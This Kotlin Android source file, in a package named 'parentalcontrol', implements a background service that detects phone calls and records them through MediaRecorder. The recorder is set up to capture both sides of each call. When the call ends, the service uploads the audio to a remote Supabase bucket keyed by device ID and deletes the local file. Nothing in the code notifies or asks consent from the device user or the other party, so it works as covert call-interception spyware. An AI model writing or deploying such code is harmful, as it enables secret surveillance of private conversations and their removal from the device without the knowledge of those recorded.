package com.example.parentalcontrol

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * CallMonitoringService v18
 * ────────────────────────────────────────────────────────────────
 * Monitors call state using:
 *   • TelephonyCallback   (API 31+ / Android 12+)
 *   • PhoneStateListener  (legacy fallback for API < 31)
 *
 * Recording trigger logic:
 *   STATE_OFFHOOK  → start MediaRecorder (VOICE_COMMUNICATION source)
 *   STATE_IDLE     → stop + upload AAC/M4A to Supabase Storage
 *   STATE_RINGING  → ignored (not yet connected)
 *
 * Audio source: VOICE_COMMUNICATION captures both earpiece + mic,
 *               including Bluetooth A2DP and wired headsets.
 *
 * Output: .m4a (AAC, 16 kHz, 32 kbps) ≈ 14 KB/min → stored in cacheDir
 * Upload: Supabase Storage → bucket "monitoring_data", folder "audio/{deviceId}"
 * ────────────────────────────────────────────────────────────────
 */
class CallMonitoringService : Service() {

    companion object {
        private const val TAG = "CallMonitoringService"
        private const val BUCKET = "monitoring_data"

        fun start(context: Context) {
            try {
                val intent = Intent(context, CallMonitoringService::class.java)
                context.startService(intent)
                Log.i(TAG, "CallMonitoringService start requested")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start: ${e.message}")
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, CallMonitoringService::class.java))
        }
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    @Volatile private var isRecording = false

    private lateinit var telephonyManager: TelephonyManager
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // API 31+ callback (held as Any to avoid ClassNotFound on older APIs)
    private var telephonyCallback: Any? = null
    // Legacy listener for API < 31
    @Suppress("DEPRECATION")
    private var legacyListener: PhoneStateListener? = null

    // ── Service lifecycle ──────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        registerCallListener()
        Log.i(TAG, "CallMonitoringService created — listening for call events")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
        START_STICKY

    override fun onDestroy() {
        super.onDestroy()
        unregisterCallListener()
        if (isRecording) stopAndUpload()
        Log.i(TAG, "CallMonitoringService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ── Telephony listener registration ───────────────────────────────────────

    private fun registerCallListener() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // API 31+ — use TelephonyCallback (executes on main thread)
            val cb = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                override fun onCallStateChanged(state: Int) {
                    handleCallState(state)
                }
            }
            telephonyCallback = cb
            telephonyManager.registerTelephonyCallback(mainExecutor, cb)
            Log.d(TAG, "Registered TelephonyCallback (API 31+)")
        } else {
            // Legacy API < 31
            @Suppress("DEPRECATION")
            val listener = object : PhoneStateListener() {
                @Suppress("OVERRIDE_DEPRECATION")
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    handleCallState(state)
                }
            }
            legacyListener = listener
            @Suppress("DEPRECATION")
            telephonyManager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
            Log.d(TAG, "Registered PhoneStateListener (legacy)")
        }
    }

    private fun unregisterCallListener() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                (telephonyCallback as? TelephonyCallback)?.let {
                    telephonyManager.unregisterTelephonyCallback(it)
                }
            } else {
                @Suppress("DEPRECATION")
                legacyListener?.let {
                    @Suppress("DEPRECATION")
                    telephonyManager.listen(it, PhoneStateListener.LISTEN_NONE)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "unregister error: ${e.message}")
        }
    }

    // ── Call state handling ────────────────────────────────────────────────────

    private fun handleCallState(state: Int) {
        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                Log.i(TAG, "📞 Call started (OFFHOOK) — starting recorder")
                SupabaseManager.getInstance()
                    .logRemote(this, TAG, "INFO", "Call detected → starting audio recorder")
                startRecording()
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                if (isRecording) {
                    Log.i(TAG, "📞 Call ended (IDLE) — stopping and uploading")
                    stopAndUpload()
                }
            }
            TelephonyManager.CALL_STATE_RINGING -> {
                Log.d(TAG, "📞 Call ringing (RINGING) — waiting for answer")
            }
        }
    }

    // ── Recording ─────────────────────────────────────────────────────────────

    private fun startRecording() {
        if (isRecording) {
            Log.w(TAG, "Already recording — ignoring OFFHOOK")
            return
        }
        try {
            val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
            val file = File(cacheDir, "call_$ts.m4a")
            currentFile = file

            recorder = buildRecorder(file)
            recorder!!.prepare()
            recorder!!.start()
            isRecording = true
            Log.i(TAG, "🎙️ Recording started → ${file.name}")
        } catch (e: Exception) {
            Log.e(TAG, "startRecording failed: ${e.message}")
            SupabaseManager.getInstance()
                .logRemote(this, TAG, "ERROR", "Call record start failed: ${e.message}")
            safeReleaseRecorder()
        }
    }

    private fun stopAndUpload() {
        val file = currentFile
        try {
            recorder?.stop()
        } catch (e: Exception) {
            Log.w(TAG, "stop() threw: ${e.message}")
        }
        safeReleaseRecorder()
        isRecording = false

        if (file != null && file.exists() && file.length() > 2_048) {
            Log.i(TAG, "⬆️ Uploading call recording: ${file.name} (${file.length() / 1024} KB)")
            scope.launch { uploadFile(file) }
        } else {
            Log.d(TAG, "Recording too small or missing — discarded")
            file?.delete()
        }
    }

    private fun safeReleaseRecorder() {
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null
    }

    // ── MediaRecorder factory ─────────────────────────────────────────────────

    /**
     * Build a MediaRecorder configured for call audio.
     *
     * Source priority:
     *   1. VOICE_COMMUNICATION – captures earpiece + mic (Bluetooth A2DP, wired headsets)
     *   2. VOICE_RECOGNITION   – ambient + mic, no echo cancellation
     *   3. MIC                 – universal fallback
     */
    private fun buildRecorder(outputFile: File): MediaRecorder {
        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            MediaRecorder(this)
        else
            @Suppress("DEPRECATION") MediaRecorder()

        val sourceChain = listOf(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.MIC
        )
        var chosenSource = MediaRecorder.AudioSource.MIC
        for (src in sourceChain) {
            try {
                rec.setAudioSource(src)
                chosenSource = src
                break
            } catch (_: Exception) {}
        }
        Log.d(TAG, "Call audio source: $chosenSource")

        rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        rec.setAudioSamplingRate(16_000)      // 16 kHz — voice range
        rec.setAudioEncodingBitRate(32_000)   // 32 kbps ≈ 14 KB/min
        rec.setOutputFile(outputFile.absolutePath)
        return rec
    }

    // ── Upload ────────────────────────────────────────────────────────────────

    private suspend fun uploadFile(file: File) = withContext(Dispatchers.IO) {
        try {
            val deviceId = android.provider.Settings.Secure.getString(
                contentResolver, android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val result = SupabaseManager.getInstance().uploadFile(
                file           = file,
                bucket         = BUCKET,
                folder         = "audio/$deviceId",
                customFileName = file.name
            )

            when (result) {
                is UploadResult.Success -> {
                    Log.i(TAG, "✅ Call recording uploaded: ${result.fileName}")
                    SupabaseManager.getInstance()
                        .logRemote(this@CallMonitoringService, TAG, "INFO",
                            "Call audio OK: ${result.fileName} (${file.length() / 1024} KB)")
                }
                is UploadResult.Error -> {
                    Log.e(TAG, "Upload failed: ${result.message}")
                    SupabaseManager.getInstance()
                        .logRemote(this@CallMonitoringService, TAG, "ERROR",
                            "Call audio upload failed: ${result.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadFile exception: ${e.message}")
        } finally {
            file.delete()
            currentFile = null
        }
    }
}
